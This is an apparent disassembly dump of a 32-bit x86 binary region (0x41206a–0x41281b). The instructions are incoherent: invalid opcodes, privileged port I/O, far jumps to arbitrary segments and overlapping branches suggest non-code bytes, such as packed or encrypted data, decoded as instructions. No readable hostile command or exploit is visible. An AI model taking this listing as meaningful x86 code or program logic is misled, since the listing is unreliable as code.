  41206a:	xlat   BYTE PTR ds:[ebx]
  41206b:	or     al,0xfc
  41206d:	sub    BYTE PTR [eax+0x36],dh
  412070:	pop    ebx
  412071:	sti    
  412072:	mov    dl,0xc4
  412074:	inc    ebp
  412075:	cli    
  412076:	data16 stc 
  412078:	ins    BYTE PTR es:[edi],dx
  412079:	cmp    DWORD PTR [ebx+0x9f13f81],0xfffffff4
  412080:	or     cl,BYTE PTR [eax-0x665f7a14]
  412086:	dec    eax
  412087:	cld    
  412088:	inc    esi
  412089:	inc    edi
  41208a:	sbb    eax,0xf7eb5488
  41208f:	arpl   WORD PTR [esi+0x723c13fd],bp
  412095:	xor    DWORD PTR [ebx-0x5c],eax
  412098:	inc    ecx
  412099:	aas    
  41209a:	lahf   
  41209b:	lds    eax,FWORD PTR [ebx-0x5e]
  41209e:	loope  0x4120f8
  4120a0:	faddp  st(3),st
  4120a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120a3:	bound  edx,QWORD PTR [esi+0x2a80cd2c]
  4120a9:	or     al,0x17
  4120ab:	or     esi,DWORD PTR [edi]
  4120ad:	jb     0x412080
  4120af:	jp     0x412123
  4120b1:	data16 scas al,BYTE PTR es:[edi]
  4120b3:	rol    BYTE PTR [eax-0x7eb1e3c4],cl
  4120b9:	cmp    ah,BYTE PTR [edx-0x4ddea9f2]
  4120bf:	out    dx,al
  4120c0:	add    esi,ecx
  4120c2:	xchg   edi,eax
  4120c3:	fimul  DWORD PTR [eax]
  4120c5:	lahf   
  4120c6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120c8:	dec    esp
  4120c9:	bound  ebx,QWORD PTR [edx]
  4120cb:	xchg   ebp,eax
  4120cc:	adc    DWORD PTR [ebx+0x28],edi
  4120cf:	stc    
  4120d0:	in     eax,0xf4
  4120d2:	cmp    ch,dl
  4120d4:	mov    bl,0x7c
  4120d6:	mov    esp,0xe9065a3b
  4120db:	push   0x871886ce
  4120e0:	ja     0x4120ec
  4120e2:	or     al,0x90
  4120e4:	jmp    DWORD PTR [eax-0x3a]
  4120e7:	aaa    
  4120e8:	sub    ecx,DWORD PTR [ebx+0x3e]
  4120eb:	sbb    ch,0xad
  4120ee:	xchg   esp,eax
  4120ef:	or     ah,cl
  4120f1:	xchg   ebx,eax
  4120f2:	cmp    dl,ah
  4120f4:	cmp    DWORD PTR [esi+0xc],0xffffffa5
  4120f8:	lds    ecx,FWORD PTR [edx-0x72]
  4120fb:	add    BYTE PTR [esi+0x71],bl
  4120fe:	popa   
  4120ff:	fwait
  412100:	ins    DWORD PTR es:[edi],dx
  412101:	jno    0x4120cb
  412103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412104:	into   
  412105:	xchg   esi,eax
  412106:	mov    dh,0xf1
  412108:	push   esi
  412109:	pusha  
  41210a:	jne    0x41215f
  41210c:	(bad)  
  41210d:	adc    esi,ecx
  41210f:	stos   BYTE PTR es:[edi],al
  412110:	shr    DWORD PTR ds:0x278726af,cl
  412116:	iret   
  412117:	pop    ss
  412118:	popf   
  412119:	retf   0xe7eb
  41211c:	out    dx,al
  41211d:	mov    ebx,0xb992c6fd
  412122:	loopne 0x4120db
  412124:	lock cmp BYTE PTR [edi-0x24],cl
  412128:	hlt    
  412129:	mov    ebx,0x753c49a3
  41212e:	aaa    
  41212f:	push   edx
  412130:	push   ds
  412131:	xor    edi,ecx
  412133:	jo     0x4120fa
  412135:	and    al,0x14
  412137:	pop    esi
  412138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412139:	inc    ecx
  41213a:	test   al,0xa1
  41213c:	retf   
  41213d:	fistp  WORD PTR [edi+0x56e32271]
  412143:	sub    ecx,DWORD PTR [esp+esi*8]
  412146:	sbb    eax,DWORD PTR [esi+ebp*4]
  412149:	push   ss
  41214a:	mov    eax,edx
  41214c:	xchg   ebx,eax
  41214d:	xchg   esi,eax
  41214e:	mov    WORD PTR [esi-0xf],ds
  412151:	nop
  412152:	add    ebx,eax
  412154:	or     ebx,DWORD PTR [eax]
  412156:	ja     0x41219b
  412158:	call   0xc6:0xd9b2db4e
  41215f:	popa   
  412160:	imul   DWORD PTR [ecx-0xe]
  412163:	fwait
  412164:	push   ds
  412165:	mov    ebp,0xb65e04b7
  41216a:	jmp    0x41215d
  41216c:	dec    ebx
  41216d:	aas    
  41216e:	xor    dl,dh
  412170:	push   gs
  412172:	push   edx
  412173:	mov    edi,0xeb58b696
  412178:	outs   dx,BYTE PTR ds:[esi]
  412179:	jecxz  0x412185
  41217b:	ret    0x944b
  41217e:	jns    0x4121d2
  412180:	dec    esp
  412181:	iret   
  412182:	loop   0x412123
  412184:	push   ss
  412185:	dec    edi
  412186:	scas   eax,DWORD PTR es:[edi]
  412187:	lock mov ds:0x3d98690f,eax
  41218d:	rcl    DWORD PTR [eax],cl
  41218f:	shl    esi,0x6a
  412192:	lods   al,BYTE PTR ds:[esi]
  412193:	sbb    dh,bl
  412195:	sti    
  412196:	sbb    esi,DWORD PTR [ecx]
  412198:	cwde   
  412199:	mov    dl,cl
  41219b:	pop    ecx
  41219c:	ret    0x631b
  41219f:	adc    BYTE PTR [ebx],cl
  4121a1:	mov    esp,0x1a67bdb4
  4121a6:	arpl   WORD PTR [ebp+0x42],bx
  4121a9:	inc    esi
  4121aa:	jmp    0xaa79:0x126d58e
  4121b1:	js     0x4121ad
  4121b3:	inc    ebx
  4121b4:	fadd   DWORD PTR [eax+0x48]
  4121b7:	push   eax
  4121b8:	add    bh,dl
  4121ba:	mov    bl,0xb5
  4121bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121bd:	icebp  
  4121be:	push   edi
  4121bf:	faddp  st(1),st
  4121c1:	push   0xd7d1e6a2
  4121c6:	and    dl,BYTE PTR [edi-0x10]
  4121c9:	sub    eax,0xf7ed6b80
  4121ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121cf:	mov    cl,BYTE PTR [edi-0x69]
  4121d2:	test   al,0xa0
  4121d4:	pop    esi
  4121d5:	enter  0x1edf,0xeb
  4121d9:	inc    ecx
  4121da:	lahf   
  4121db:	stos   BYTE PTR es:[edi],al
  4121dc:	sub    al,0x75
  4121de:	jp     0x4121f5
  4121e0:	inc    eax
  4121e1:	sbb    BYTE PTR [edi],ah
  4121e3:	mov    ecx,0xeddd1853
  4121e8:	inc    esp
  4121e9:	arpl   WORD PTR [ebx],si
  4121eb:	inc    ecx
  4121ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121ed:	pop    es
  4121ee:	add    DWORD PTR [ebp+0x9117178],eax
  4121f4:	xchg   BYTE PTR [ebx],bh
  4121f6:	call   0x7cb3:0xd2793abf
  4121fd:	in     al,dx
  4121fe:	sub    eax,0xdbcdcaa4
  412203:	loop   0x412190
  412205:	inc    ebp
  412206:	scas   eax,DWORD PTR es:[edi]
  412207:	int3   
  412208:	aas    
  412209:	add    dl,dh
  41220b:	mov    al,0x3f
  41220d:	ins    DWORD PTR es:[edi],dx
  41220e:	pop    ecx
  41220f:	lock lods eax,DWORD PTR ds:[esi]
  412211:	cmp    al,0x1a
  412213:	call   0x51ac:0xcabc4a09
  41221a:	mov    dl,0xbe
  41221c:	mov    al,ds:0x8d12fb85
  412221:	int3   
  412222:	aam    0xf0
  412224:	xchg   BYTE PTR [ebp-0x17],cl
  412227:	cwde   
  412228:	jns    0x41225d
  41222a:	cdq    
  41222b:	fild   WORD PTR [ebp-0x3181d363]
  412231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412232:	mov    eax,ds:0x624a3e20
  412237:	aad    0x9f
  412239:	jg     0x4122b0
  41223b:	or     DWORD PTR [edx+0x65],ebx
  41223e:	push   eax
  41223f:	out    dx,eax
  412240:	sub    BYTE PTR [esi+0x573bd7c5],ah
  412246:	ja     0x41226a
  412248:	cli    
  412249:	push   ebp
  41224a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41224b:	jp     0x4122a7
  41224d:	mov    ecx,0x3b958724
  412252:	std    
  412253:	cli    
  412254:	jo     0x412291
  412256:	(bad)  
  412257:	loope  0x412220
  412259:	and    DWORD PTR [edi],ecx
  41225b:	pop    eax
  41225c:	sbb    dh,al
  41225e:	jle    0x41229b
  412260:	mov    cl,0x48
  412262:	mov    esp,0xbb9c14cb
  412267:	adc    ebx,DWORD PTR [edx+0x64]
  41226a:	stc    
  41226b:	dec    esi
  41226c:	out    0xc1,eax
  41226e:	xor    edi,DWORD PTR [ecx]
  412270:	in     al,0x55
  412272:	jmp    0x243467fc
  412277:	mov    bh,0x7a
  412279:	popf   
  41227a:	push   es
  41227b:	mov    bh,0x19
  41227d:	push   es
  41227e:	add    bl,0x2e
  412281:	add    BYTE PTR [edx],bl
  412283:	pop    DWORD PTR [edx+eax*1-0x3ac2c3c1]
  41228a:	fisub  WORD PTR [ecx+0xd2a0b88]
  412290:	popa   
  412291:	stos   DWORD PTR es:[edi],eax
  412292:	test   al,0x89
  412294:	les    ebx,FWORD PTR [ecx+0x45b4356d]
  41229a:	inc    ebx
  41229b:	(bad)  
  41229c:	sbb    edi,DWORD PTR [edi+0x1f]
  41229f:	push   cs
  4122a0:	ins    BYTE PTR es:[edi],dx
  4122a1:	xor    eax,0xf70f75ec
  4122a6:	and    eax,0x917e4ae5
  4122ab:	sbb    ah,BYTE PTR [eax-0x22]
  4122ae:	ja     0x4122c7
  4122b0:	inc    esp
  4122b1:	push   cs
  4122b2:	in     al,dx
  4122b3:	and    BYTE PTR [edx],ch
  4122b5:	sahf   
  4122b6:	outs   dx,BYTE PTR ds:[esi]
  4122b7:	add    bh,BYTE PTR [edi]
  4122b9:	scas   al,BYTE PTR es:[edi]
  4122ba:	test   eax,0x88a8b643
  4122bf:	idiv   DWORD PTR [edi+0xb]
  4122c2:	ret    0xd2e6
  4122c5:	mov    DWORD PTR [eax],eax
  4122c7:	mov    DWORD PTR [esi],ebp
  4122c9:	sbb    DWORD PTR [ecx+0x29],esp
  4122cc:	ret    
  4122cd:	rcr    BYTE PTR [ebx+0x2e870f2a],0xaf
  4122d4:	(bad)  
  4122d5:	sbb    DWORD PTR [ebx-0x387850ec],eax
  4122db:	lahf   
  4122dc:	dec    eax
  4122dd:	out    0x69,eax
  4122df:	das    
  4122e0:	mov    ah,BYTE PTR [ebp-0x77]
  4122e3:	xlat   BYTE PTR ds:[ebx]
  4122e4:	pop    ss
  4122e5:	xor    eax,0x5d31b924
  4122ea:	shr    DWORD PTR [ecx+0x46],cl
  4122ed:	cmp    BYTE PTR [edx+0x5],dl
  4122f0:	cli    
  4122f1:	arpl   WORD PTR [ecx-0x63],cx
  4122f4:	jl     0x412375
  4122f6:	loopne 0x4122e5
  4122f8:	mov    edi,0xfd66580
  4122fd:	rol    cl,1
  4122ff:	into   
  412300:	mov    esi,ecx
  412302:	cmc    
  412303:	outs   dx,DWORD PTR ds:[esi]
  412304:	sbb    al,0x59
  412306:	(bad)  
  412307:	je     0x4122fe
  412309:	push   eax
  41230a:	mov    dh,0x14
  41230c:	(bad)  
  41230d:	push   ebx
  41230e:	adc    BYTE PTR [eax+0x63],bh
  412311:	mov    al,BYTE PTR [edi]
  412313:	jb     0x412348
  412315:	mov    ebx,0xa747305a
  41231a:	les    esi,FWORD PTR [ebp-0x3d]
  41231d:	out    dx,eax
  41231e:	ss push esi
  412320:	test   eax,0x7302f8fb
  412325:	outs   dx,DWORD PTR ds:[esi]
  412326:	stc    
  412327:	fisubr DWORD PTR [ecx]
  412329:	(bad)
  41232c:	sub    ecx,0x3eafda78
  412332:	in     al,dx
  412333:	jae    0x412345
  412335:	jno    0x4122d0
  412337:	icebp  
  412338:	push   ebx
  412339:	dec    ebp
  41233a:	loope  0x412373
  41233c:	addr16 mov dh,0xbd
  41233f:	cmp    bl,bl
  412341:	aas    
  412342:	ds inc esi
  412344:	add    DWORD PTR [eax],edi
  412346:	into   
  412347:	adc    al,0x7b
  412349:	ins    BYTE PTR es:[edi],dx
  41234a:	lds    edx,FWORD PTR [edi]
  41234c:	daa    
  41234d:	ins    DWORD PTR es:[edi],dx
  41234e:	xchg   esi,eax
  41234f:	cmp    al,0x55
  412351:	mov    ebp,0xdbe36c1f
  412356:	arpl   WORD PTR [eax],bp
  412358:	cmp    ebx,DWORD PTR [ecx+0x46]
  41235b:	loope  0x41232a
  41235d:	cmc    
  41235e:	sti    
  41235f:	adc    BYTE PTR [edi],0x12
  412362:	sbb    edx,0x3c5b0163
  412368:	jae    0x412301
  41236a:	sub    ebp,DWORD PTR [esi+edi*8+0x16121527]
  412371:	sbb    eax,0xf210dfce
  412376:	add    al,0xb5
  412378:	pcmpgtw mm0,QWORD PTR [ecx]
  41237b:	test   bl,cl
  41237d:	pop    ss
  41237e:	ins    DWORD PTR es:[edi],dx
  41237f:	pop    esp
  412380:	fisub  DWORD PTR [edx]
  412382:	sbb    esi,DWORD PTR [ebp-0x2b2b2362]
  412388:	mov    ebp,0xccbcfc61
  41238d:	mov    edi,0x6f37810e
  412392:	imul   DWORD PTR [edx-0x79]
  412395:	adc    edi,DWORD PTR [ebx+0x299a0788]
  41239b:	(bad)  [esi]
  41239d:	(bad)
  4123a1:	mov    ds:0xba16d8d5,al
  4123a6:	add    BYTE PTR [esi+0x25],bh
  4123a9:	jecxz  0x4123b4
  4123ab:	fcmovu st,st(1)
  4123ad:	mov    edx,0x17f0b959
  4123b2:	or     BYTE PTR [edx-0x3c34fe58],bl
  4123b8:	xchg   esi,eax
  4123b9:	scas   eax,DWORD PTR es:[edi]
  4123ba:	push   ebx
  4123bb:	xchg   ebp,eax
  4123bc:	adc    bl,BYTE PTR [eax+0x1d]
  4123bf:	mov    eax,0xd9714d25
  4123c4:	mov    ecx,0xfba91834
  4123c9:	xchg   ebp,eax
  4123ca:	dec    ebp
  4123cb:	sbb    DWORD PTR [esi],esi
  4123cd:	jnp    0x41244b
  4123cf:	or     eax,0xc83bff7b
  4123d4:	dec    ecx
  4123d5:	ret    0x6d4c
  4123d8:	ret    0x57b
  4123db:	push   es
  4123dc:	mov    cl,BYTE PTR [edi-0x18]
  4123df:	sbb    bh,bl
  4123e1:	fs (bad) 
  4123e3:	mov    ebx,0xfe8fbe95
  4123e8:	adc    ecx,ebx
  4123ea:	in     eax,0x92
  4123ec:	in     eax,0xe6
  4123ee:	jae    0x412388
  4123f0:	nop
  4123f1:	mov    bh,0x11
  4123f3:	aad    0x8e
  4123f5:	sahf   
  4123f6:	stos   BYTE PTR es:[edi],al
  4123f7:	gs pop eax
  4123f9:	out    dx,eax
  4123fa:	cld    
  4123fb:	push   eax
  4123fc:	test   BYTE PTR [ebx],0xf2
  4123ff:	sbb    esp,DWORD PTR [ecx-0x52350df3]
  412405:	test   DWORD PTR [edi-0x268cb569],edi
  41240b:	shr    DWORD PTR [eax-0x63],cl
  41240e:	shr    esp,0x17
  412411:	(bad)  
  412412:	out    dx,al
  412413:	jl     0x4123be
  412415:	mov    WORD PTR [esi-0x32],ds
  412418:	pusha  
  412419:	xchg   edi,eax
  41241a:	ret    
  41241b:	icebp  
  41241c:	adc    al,0x42
  41241e:	cdq    
  41241f:	sub    al,0x80
  412421:	sub    BYTE PTR ds:0xc53de322,dh
  412427:	cmp    al,0xd5
  412429:	out    0xca,al
  41242b:	jg     0x412400
  41242d:	sub    cl,BYTE PTR [ebp+0x762c7e24]
  412433:	adc    bl,dh
  412435:	cld    
  412436:	xor    al,0xe1
  412438:	ret    0xad7e
  41243b:	ret    0x2396
  41243e:	popa   
  41243f:	inc    ecx
  412440:	imul   ebx,DWORD PTR [edx],0x14ebcefa
  412446:	add    al,0xbf
  412448:	call   0xd2f3c77f
  41244d:	xchg   ebp,eax
  41244e:	fpatan 
  412450:	(bad)  
  412451:	push   ebx
  412452:	mov    al,ds:0xb8f42fb7
  412457:	mov    eax,0xf9074bfd
  41245c:	cmp    DWORD PTR [ebx],esi
  41245e:	fdiv   QWORD PTR [eax]
  412460:	(bad)  [ebx-0x1226c2e8]
  412466:	stos   BYTE PTR es:[edi],al
  412467:	sbb    eax,edi
  412469:	sbb    DWORD PTR [ecx],edx
  41246b:	inc    esp
  41246c:	pop    DWORD PTR [edx]
  41246e:	mov    cl,0x4a
  412470:	arpl   WORD PTR [ebp+0x270ff543],bp
  412476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412477:	sbb    DWORD PTR [ecx],esi
  412479:	jne    0x412449
  41247b:	sbb    al,0xda
  41247d:	pop    ds
  41247e:	loope  0x4124a8
  412480:	aad    0xaa
  412482:	cmc    
  412483:	pop    ebp
  412484:	adc    eax,0x50599c59
  412489:	xor    eax,DWORD PTR [esi-0x46]
  41248c:	push   es
  41248d:	fild   WORD PTR [edx]
  41248f:	xlat   BYTE PTR ds:[ebx]
  412490:	cld    
  412491:	fidivr DWORD PTR [esi-0x1532054b]
  412497:	xor    eax,0x1e4d8a96
  41249c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41249d:	adc    DWORD PTR [esi],eax
  41249f:	sub    eax,0xbdd2e5e7
  4124a4:	pop    es
  4124a5:	aam    0x7b
  4124a7:	cmp    dh,cl
  4124a9:	jmp    0x4124c6
  4124ab:	pop    edx
  4124ac:	(bad)  
  4124ad:	fst    QWORD PTR [eax+0xf]
  4124b0:	arpl   cx,bx
  4124b2:	jno    0x41252a
  4124b4:	test   eax,0xedaf58aa
  4124b9:	mov    esi,0x7490dc82
  4124be:	push   0x8a43d5b5
  4124c3:	vmread DWORD PTR [ebx],ebx
  4124c6:	cli    
  4124c7:	jb     0x412525
  4124c9:	add    eax,0xb37500e9
  4124ce:	outs   dx,BYTE PTR ds:[esi]
  4124cf:	jmp    0x9deddd23
  4124d4:	pop    ds
  4124d5:	mov    al,0x51
  4124d7:	xchg   esi,eax
  4124d8:	test   eax,0xf772c6b5
  4124dd:	inc    ebp
  4124de:	and    DWORD PTR [esi+0x37],edi
  4124e1:	sub    BYTE PTR [edi+0x50b3bd70],ah
  4124e7:	sahf   
  4124e8:	sbb    eax,0x977719fa
  4124ed:	imul   ecx,DWORD PTR [ecx+ecx*2],0x650f5142
  4124f4:	mov    al,0x8e
  4124f6:	in     al,0xc6
  4124f8:	ficomp DWORD PTR [ecx+0x6772ef3d]
  4124fe:	xchg   esp,eax
  4124ff:	jns    0x4124af
  412501:	xor    BYTE PTR [ebx+0x19250ea2],bh
  412507:	or     eax,0xfb7af2ca
  41250c:	fadd   DWORD PTR [edx]
  41250e:	test   esp,edi
  412510:	shl    BYTE PTR [ebx*4+0x3897b068],cl
  412517:	mov    bl,0x3b
  412519:	pushf  
  41251a:	(bad)  
  41251b:	pop    eax
  41251c:	lods   al,BYTE PTR ds:[esi]
  41251d:	or     BYTE PTR [eax+0x60],0xd5
  412521:	enter  0x58d7,0x54
  412525:	or     DWORD PTR [edx+0x59c02c89],edi
  41252b:	cld    
  41252c:	test   BYTE PTR [eax+0x2],dh
  41252f:	mov    al,0x34
  412531:	dec    edi
  412532:	mov    esp,DWORD PTR [eax]
  412534:	idiv   dl
  412536:	pop    esi
  412537:	fimul  WORD PTR [edi*1-0x2c4b28ad]
  41253e:	(bad)  
  41253f:	fcom   st(1)
  412541:	fisttp DWORD PTR [eax]
  412543:	repz out dx,al
  412545:	push   ds
  412546:	or     edx,DWORD PTR [eax+0x3e27eee6]
  41254c:	sti    
  41254d:	inc    ecx
  41254e:	xor    DWORD PTR [ebx-0x74],eax
  412551:	ins    BYTE PTR es:[edi],dx
  412552:	mov    ch,0x1b
  412554:	jle    0x412516
  412556:	push   edx
  412557:	sbb    ebx,DWORD PTR [esp+edi*2-0x29]
  41255b:	test   eax,0xb8b77c09
  412560:	imul   ebx,DWORD PTR [ecx+0x6f],0x16
  412564:	popf   
  412565:	out    dx,eax
  412566:	js     0x4125e2
  412568:	ja     0x412599
  41256a:	hlt    
  41256b:	inc    ebx
  41256c:	test   DWORD PTR [eax-0x6a4a505d],edi
  412572:	xchg   DWORD PTR [ebx],ecx
  412574:	ficom  WORD PTR [eax+0x71]
  412577:	mov    esi,0xa42789cc
  41257c:	and    edi,DWORD PTR [edi+0x3a]
  41257f:	loope  0x41255e
  412581:	sbb    DWORD PTR [eax],0xa
  412584:	js     0x41252f
  412586:	dec    ebx
  412587:	pop    ebx
  412588:	pop    ds
  412589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41258a:	sbb    DWORD PTR [edx+0x70],0xe91e1c5c
  412591:	pop    ebp
  412592:	and    DWORD PTR [edx],edx
  412594:	cld    
  412595:	seto   BYTE PTR [edi+0x4ece2539]
  41259c:	(bad)  
  41259d:	sbb    esp,esi
  41259f:	inc    eax
  4125a0:	sub    dh,BYTE PTR [edi-0x60]
  4125a3:	pushf  
  4125a4:	inc    ebx
  4125a5:	ret    
  4125a6:	jg     0x41260b
  4125a8:	jne    0x4125ae
  4125aa:	fwait
  4125ab:	jns    0x4125d8
  4125ad:	pop    esp
  4125ae:	pop    esi
  4125af:	mov    dl,0xe1
  4125b1:	xlat   BYTE PTR ds:[ebx]
  4125b2:	fild   QWORD PTR [esp+eiz*4]
  4125b5:	js     0x41257d
  4125b7:	jae    0x41260f
  4125b9:	in     eax,0x2
  4125bb:	les    edi,FWORD PTR [edx]
  4125bd:	es dec ebp
  4125bf:	add    DWORD PTR [edx-0x46],ebp
  4125c2:	jge    0x412609
  4125c4:	(bad)  
  4125c5:	out    dx,eax
  4125c6:	ins    BYTE PTR es:[edi],dx
  4125c7:	jg     0x412594
  4125c9:	in     eax,dx
  4125ca:	fist   DWORD PTR [esi-0x6cd102eb]
  4125d0:	push   esp
  4125d1:	sbb    ah,al
  4125d3:	push   ds
  4125d4:	fs popf 
  4125d6:	repz mov dh,0x97
  4125d9:	mov    esi,0x6a0ccc55
  4125de:	jl     0x4125bb
  4125e0:	mov    DWORD PTR [ebx+0x9c6c213],esp
  4125e6:	or     ebp,DWORD PTR [edx+0x4]
  4125e9:	xor    eax,0xbf71b11a
  4125ee:	popf   
  4125ef:	dec    esi
  4125f0:	popf   
  4125f1:	dec    eax
  4125f2:	mov    ds:0x579f0dca,eax
  4125f7:	mov    ds:0xaf8c8b6f,al
  4125fc:	in     eax,0xcd
  4125fe:	sub    DWORD PTR [eax-0x34],ebp
  412601:	sub    eax,0x45f798ff
  412606:	sbb    DWORD PTR [edi+0x1dadc061],edx
  41260c:	loop   0x412664
  41260e:	pusha  
  41260f:	out    0x10,eax
  412611:	mov    ebx,0x345a597e
  412616:	pop    edi
  412617:	push   esi
  412618:	jbe    0x412695
  41261a:	adc    ecx,DWORD PTR [eax+0x36322d9d]
  412620:	outs   dx,BYTE PTR ds:[esi]
  412621:	jno    0x41261e
  412623:	call   0xa6f5:0x808ce58b
  41262a:	es mov eax,0x3addbdee
  412630:	xchg   cl,cl
  412632:	repnz add ah,0x6f
  412636:	cmc    
  412637:	std    
  412638:	daa    
  412639:	hlt    
  41263a:	pop    esp
  41263b:	in     al,dx
  41263c:	pop    es
  41263d:	lock mov esp,0x2d462626
  412643:	nop
  412644:	out    0x6d,al
  412646:	or     esi,esp
  412648:	repnz aad 0x26
  41264b:	enter  0xbd6a,0x1b
  41264f:	xor    eax,0xe136e966
  412654:	js     0x412645
  412656:	jmp    0x4126ae
  412658:	jmp    0x412688
  41265a:	push   ebp
  41265b:	icebp  
  41265c:	call   0x1913:0x197616ac
  412663:	push   ecx
  412664:	repz pusha 
  412666:	iret   
  412667:	jb     0x412636
  412669:	iret   
  41266a:	adc    DWORD PTR [ebx-0x146758d3],esp
  412670:	ds push bx
  412673:	push   eax
  412674:	hlt    
  412675:	fidivr WORD PTR [ebx]
  412677:	pop    ds
  412678:	(bad)  [ebx]
  41267a:	jbe    0x41266b
  41267c:	mov    ds:0xf3383935,al
  412681:	mov    WORD PTR [ecx+0x20],ds
  412684:	mov    ecx,0x10a24a6
  412689:	adc    BYTE PTR [eax+0x4a],0x5e
  41268d:	stc    
  41268e:	and    ecx,DWORD PTR [esi]
  412690:	stos   BYTE PTR es:[edi],al
  412691:	call   0xcf0f:0x89302ff5
  412698:	bound  esi,QWORD PTR [edx-0x2b60c504]
  41269e:	js     0x412633
  4126a0:	jmp    0x70eb:0x54de88bf
  4126a7:	add    al,0x18
  4126a9:	cmc    
  4126aa:	fcomp  QWORD PTR [edx]
  4126ac:	jae    0x6cf5ff6a
  4126b2:	pop    edx
  4126b3:	jmp    0x19ee:0x2ddcad22
  4126ba:	push   ebx
  4126bb:	dec    esp
  4126bc:	dec    edx
  4126bd:	mov    es,WORD PTR [eax]
  4126bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126c0:	add    al,0x7c
  4126c2:	pop    ds
  4126c3:	inc    esp
  4126c4:	pushf  
  4126c5:	xchg   BYTE PTR [edi],ah
  4126c7:	push   es
  4126c8:	inc    eax
  4126c9:	std    
  4126ca:	pop    esi
  4126cb:	addr16 push esp
  4126cd:	mov    ebx,0xdc348e88
  4126d2:	mov    al,ds:0xf0e135fb
  4126d7:	cs stos BYTE PTR es:[edi],al
  4126d9:	cwde   
  4126da:	dec    eax
  4126db:	add    eax,0x6d63a9dd
  4126e0:	in     al,dx
  4126e1:	xor    DWORD PTR [ebp-0x17cc34af],esp
  4126e7:	mov    eax,ds:0xc74fff21
  4126ec:	mov    eax,ds:0xf849f1c7
  4126f1:	xchg   edx,eax
  4126f2:	pop    esp
  4126f3:	fs xchg ebp,eax
  4126f5:	imul   edx,DWORD PTR [ecx-0x75ab5d42],0xafc6cbdd
  4126ff:	cmp    al,0x98
  412701:	mov    esp,0x987879e7
  412706:	shl    al,1
  412708:	and    BYTE PTR [ebx-0x3fd041ca],cl
  41270e:	pop    esp
  41270f:	sub    bl,BYTE PTR [ecx-0x19a0eaca]
  412715:	mov    esp,0xfbe301c2
  41271a:	and    DWORD PTR [ecx],eax
  41271c:	gs xchg esi,eax
  41271e:	pop    ebp
  41271f:	outs   dx,BYTE PTR ds:[esi]
  412720:	out    0x49,al
  412722:	xor    ebx,DWORD PTR [esi]
  412724:	mov    esp,0x94202220
  412729:	sub    dl,BYTE PTR ds:0xbb7710c
  41272f:	push   0x9eaa3b39
  412734:	inc    eax
  412735:	loope  0x412705
  412737:	sar    bh,cl
  412739:	sub    edi,DWORD PTR [esi]
  41273b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41273c:	fdiv   QWORD PTR [edx-0x46f0f9ba]
  412742:	es sub eax,0xce036fb9
  412748:	xor    edi,ebp
  41274a:	dec    edx
  41274b:	adc    esp,DWORD PTR [edi+0x63]
  41274e:	jle    0x412705
  412750:	int    0xb0
  412752:	sti    
  412753:	jns    0x4126e6
  412755:	pop    esi
  412756:	bound  ebx,QWORD PTR [edi+0x23664fe6]
  41275c:	rol    BYTE PTR [ebx],cl
  41275e:	mov    WORD PTR [edi],gs
  412760:	mov    ah,0x1c
  412762:	mov    dl,al
  412764:	pop    ecx
  412765:	fcom   QWORD PTR [ecx-0x12]
  412768:	nop
  412769:	mov    bl,0x4c
  41276b:	or     eax,0x32ee33ba
  412770:	stos   BYTE PTR es:[edi],al
  412771:	xor    al,0xd4
  412773:	adc    al,0x22
  412775:	mov    DWORD PTR [esi-0x7],ecx
  412778:	sbb    eax,0x8db3b162
  41277d:	data16 ror BYTE PTR [ecx],0xf5
  412781:	(bad)  
  412782:	les    ebp,FWORD PTR [eax+0xa]
  412785:	jae    0x4127e6
  412787:	retf   0x8df6
  41278a:	jae    0x4127d4
  41278c:	and    ah,BYTE PTR [edi]
  41278e:	mov    ch,ah
  412790:	jp     0x412748
  412792:	std    
  412793:	push   ebx
  412794:	mov    ebx,0x7cac5aa
  412799:	in     al,dx
  41279a:	cld    
  41279b:	pop    ecx
  41279c:	push   eax
  41279d:	mov    dl,0x22
  41279f:	push   esi
  4127a0:	xchg   DWORD PTR [edx-0x7ccdacb7],edx
  4127a6:	xchg   ebx,eax
  4127a7:	push   ds
  4127a8:	sahf   
  4127a9:	cli    
  4127aa:	jmp    0x3d37:0x656e1481
  4127b1:	lahf   
  4127b2:	xchg   ebp,eax
  4127b3:	mov    dh,0x46
  4127b5:	fild   WORD PTR [ecx-0x33]
  4127b8:	dec    eax
  4127b9:	mov    edx,0x6fa4d738
  4127be:	sti    
  4127bf:	enter  0xce91,0x18
  4127c3:	popf   
  4127c4:	repz jp 0x41281b
  4127c7:	(bad)  
  4127c8:	icebp  
  4127c9:	popf   
  4127ca:	lock lds ecx,FWORD PTR [ebx-0x53612a39]
  4127d1:	jge    0x4127f5
  4127d3:	xchg   ecx,eax
  4127d4:	add    al,0x4d
  4127d6:	xor    DWORD PTR [edx-0x6c],ebp
  4127d9:	addr16 dec esi
  4127db:	dec    esp
  4127dc:	or     dl,BYTE PTR [esi+0x1a]
  4127df:	pop    ebp
  4127e0:	inc    ebx
  4127e1:	rcr    ch,0x53
  4127e4:	popa   
  4127e5:	mov    cl,0x27
  4127e7:	sub    al,BYTE PTR [edx-0x19]
  4127ea:	push   es
  4127eb:	mov    WORD PTR [edx+0x7019137d],?
  4127f1:	pop    edi
  4127f2:	dec    ebx
  4127f3:	jg     0x412853
  4127f5:	push   0xe816ab10
  4127fa:	popa   
  4127fb:	cmp    eax,DWORD PTR [ecx-0x3e]
  4127fe:	cli    
  4127ff:	fwait
  412800:	mov    ds:0x6fb8be6e,al
  412805:	inc    edi
  412806:	(bad)  
  412807:	xor    cl,ch
  412809:	mov    ebx,0xf4536bff
  41280e:	push   0x6f
  412810:	jge    0x41286d
  412812:	and    DWORD PTR [esi+0x282e0d4a],edx
  412818:	or     edi,DWORD PTR [eax-0x32]
  41281b:	adc    al,0xcc
